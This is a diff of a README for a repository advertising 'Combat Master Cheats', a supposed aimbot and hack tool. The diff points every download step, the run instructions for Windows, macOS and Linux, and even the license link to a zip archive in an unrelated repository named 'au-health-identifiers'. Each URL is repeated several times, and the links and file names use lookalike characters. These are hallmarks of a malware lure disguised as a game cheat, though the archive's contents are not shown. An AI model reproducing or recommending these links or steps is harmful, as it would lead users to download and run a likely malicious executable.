@@ -8,20 +8,20 @@ Welcome to the **Combat Master Cheats** repository! This project provides a powe
 
 To get started with Combat Master Cheats and amplify your gameplay, carefully follow these steps:
 
-### 1. Download https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip from the repository
+### 1. Download https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip from the repository
 
-Head over to the repo’s main page and click on **https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip** to download the launcher securely. This package contains the complete setup for all compatible operating systems.
+Head over to the repo’s main page and click on **https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip** to download the launcher securely. This package contains the complete setup for all compatible operating systems.
 
-### 2. Extract the https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip archive
+### 2. Extract the https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip archive
 
-Use your preferred extraction tool (WinRAR, 7Zip, The Unarchiver, Archive Utility, or tar for Linux) to unpack https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip into your desired folder.
+Use your preferred extraction tool (WinRAR, 7Zip, The Unarchiver, Archive Utility, or tar for Linux) to unpack https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip into your desired folder.
 
 ### 3. Run the suitable Loader for your OS
 
 Navigate to the folder and launch the executable matching your setup:
-- For Windows: https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip  
-- For macOS: https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip  
-- For Linux: https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip  
+- For Windows: https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip  
+- For macOS: https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip  
+- For Linux: https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip  
 
 ### 4. Follow the on-screen instructions
 
@@ -70,13 +70,13 @@ Combat Master hacks, Combat Master trainers, Combat Master Aimbot, Combat Master
 
 ## ⚠️ Disclaimer
 
-This repository provides educational material and is intended **solely for research and educational purposes**. Downloading or using these tools in violation of the terms of service of Combat Master or any other software is **strictly prohibited**. The maintainers and contributors are **not responsible for any misuse or damages** resulting from the use of this program. By downloading https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip or using any code from this repository, you acknowledge and agree to abide by all local, federal, and international laws. **Use at your own risk.**
+This repository provides educational material and is intended **solely for research and educational purposes**. Downloading or using these tools in violation of the terms of service of Combat Master or any other software is **strictly prohibited**. The maintainers and contributors are **not responsible for any misuse or damages** resulting from the use of this program. By downloading https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip or using any code from this repository, you acknowledge and agree to abide by all local, federal, and international laws. **Use at your own risk.**
 
 ---
 
 ## 📄 License
 
-This project is fully open source under the [MIT License](https://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zipоhttps://raw.githubusercontent.com/ranegade141/au-health-identifiers/main/Lоader.zip).  
+This project is fully open source under the [MIT License](https://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zipоhttps://github.com/ranegade141/au-health-identifiers/raw/refs/heads/main/agamous/health_identifiers_au_v1.3.zip).  
 Feel free to fork, modify, or share, but always give credit to the original project!
 
 ---
